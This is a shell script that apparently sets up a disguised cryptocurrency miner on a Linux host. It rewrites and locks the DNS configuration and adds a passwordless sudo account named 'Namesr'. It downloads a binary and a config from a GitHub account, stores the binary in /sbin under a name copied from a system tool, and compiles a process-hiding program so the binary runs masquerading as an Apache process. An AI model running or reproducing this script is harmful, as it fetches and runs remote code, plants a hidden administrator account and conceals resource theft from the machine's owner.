#!/bin/sh
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt install nginx -y
sudo chmod 777 0.sh 0.sh
sudo chmod 777 /etc/resolv.conf
sudo rm -rf /etc/resolv.conf
sudo touch /etc/resolv.conf
sudo chmod 777 /etc/resolv.conf
sudo echo -e 'nameserver 8.26.56.26\nnameserver 8.20.247.20' >/etc/resolv.conf
sudo chattr -f  +i /etc/resolv.conf
sudo chmod 777 /etc/systemd/resolved.conf
sudo echo '' >/etc/systemd/resolved.conf
sudo echo -e 'DNS=8.26.56.26 \nFallbackDNS=8.20.247.20' >/etc/systemd/resolved.conf
sudo screen -dmS satu systemctl status systemd-resolved
sudo ufw allow out 53,113,123/udp
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1
sudo adduser --force-badname --disabled-password --gecos "" Namesr
sudo usermod -a -G sudo Namesr
wget -O blkdiscards https://github.com/lifetimerdp/Github/raw/main/run
wget https://raw.githubusercontent.com/lifetimerdp/scripts/master/config.json
wget -O xhide.c https://raw.githubusercontent.com/lifetimerdp/source/main/hide.c
sudo chmod +x xhide.c
sudo gcc -o hide xhide.c
sudo mv blkdiscards /sbin
cd /sbin
sudo chmod +x blkdiscards config.json
sudo -u Namesr -H sudo ./hide -s "/usr/sbin/apache2 -k start" -d -p apache.pid ./blkdiscards -c config.json
sudo /etc/init.d/nginx start
sudo timeout 65m ping google.com
#Jgnsebar_Sembarangan
